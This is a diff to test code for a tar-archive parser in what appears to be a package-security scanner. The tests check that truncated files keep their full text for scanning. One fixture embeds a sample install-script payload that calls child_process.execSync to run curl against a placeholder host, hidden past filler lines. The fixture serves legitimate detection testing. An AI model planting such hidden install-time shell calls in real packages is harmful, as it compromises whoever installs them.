@@ -201,7 +201,28 @@ describe("readTar regular files", () => {
     const files = await parse(tar, { ...PARSE_LIMITS, maxBytesPerFile: 1024 });
     expect(files[0].flags).toContain("truncated");
     expect(files[0].size).toBe(2048);
+    // textSample persists the bounded sample; scanText carries the full body so
+    // detection scans bytes the sample dropped.
     expect(files[0].textSample?.length).toBe(1024);
+    expect(files[0].scanText?.length).toBe(2048);
+  });
+
+  test("captures a payload that sits past the persisted sample window", async () => {
+    const filler = "// padding\n".repeat(200); // > maxBytesPerFile below
+    const payload = "require('child_process').execSync('curl https://example.invalid');\n";
+    const tar = buildTar([{ name: "package/install.js", body: filler + payload }]);
+    const files = await parse(tar, { ...PARSE_LIMITS, maxBytesPerFile: 1024 });
+    expect(files[0].flags).toContain("truncated");
+    // The payload falls outside the persisted sample but lives in scanText.
+    expect(files[0].textSample).not.toContain("child_process");
+    expect(files[0].scanText).toContain("child_process");
+  });
+
+  test("omits scanText when the body fits the sample bound", async () => {
+    const tar = buildTar([{ name: "package/index.js", body: "export const x = 1;\n" }]);
+    const files = await parse(tar);
+    expect(files[0].textSample).toBe("export const x = 1;\n");
+    expect(files[0].scanText).toBeUndefined();
   });
 
   test("omits low-value generated text samples while preserving metadata", async () => {
@@ -660,6 +681,7 @@ describe("rendered sandbox parser source", () => {
   const SANDBOX_EXPORT_NAMES = [
     "readString",
     "decodeText",
+    "decodeScanText",
     "isPlainObject",
     "normalizeStringRecord",
     "canonicalizePath",
